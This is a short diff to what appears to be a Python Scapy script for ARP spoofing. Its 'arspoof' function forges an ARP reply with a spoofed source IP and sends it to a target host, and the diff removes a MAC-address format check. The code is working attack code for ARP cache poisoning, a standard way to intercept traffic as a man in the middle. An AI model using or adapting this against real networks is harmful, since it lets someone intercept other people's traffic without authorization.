@@ -24,9 +24,6 @@ def get_mac(ip_1):
 def arspoof(ip_1, ip_2, regex_mac):
     trame = ARP(op = 2, psrc = ip_1, pdst = ip_2, hwdst = get_mac(ip_1))
     trame.show()
-    if (re.match(regex_mac, trame.hwdst) == None):
-        os.write(2, "[\033[31m-\033[00m] Error: mac adress must match with the regular expression.\n")
-        exit(84)
     print("[\033[32m+\033[00m] Sending packets to " + ip_2)
     os.write(1, "[\033[32m+\033[00m] ")
     srp(trame)
